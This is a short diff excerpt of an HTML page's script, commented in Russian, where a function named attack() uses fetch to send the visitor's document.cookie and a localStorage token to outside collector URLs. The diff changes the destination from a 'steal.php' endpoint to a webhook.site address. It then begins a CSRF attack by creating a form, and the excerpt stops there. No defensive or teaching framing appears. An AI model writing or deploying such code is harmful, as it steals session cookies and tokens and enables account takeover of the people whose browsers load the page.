@@ -55,11 +55,11 @@
   <script>
     function attack() {
       // 1. Отправка cookie
-      fetch("https://kazcybertoken.ct.ws/steal.php?cookie=" + encodeURIComponent(document.cookie));
+      fetch("https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?cookie=" + encodeURIComponent(document.cookie));
 
       // 2. Отправка токена, даже если он null
       const token = localStorage.getItem("token");
-      fetch("https://kazcybertoken.ct.ws/steal.php?token=" + encodeURIComponent(token));
+      fetch("https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?token=" + encodeURIComponent(token));
 
       // 3. CSRF-атака
       const form = document.createElement("form");
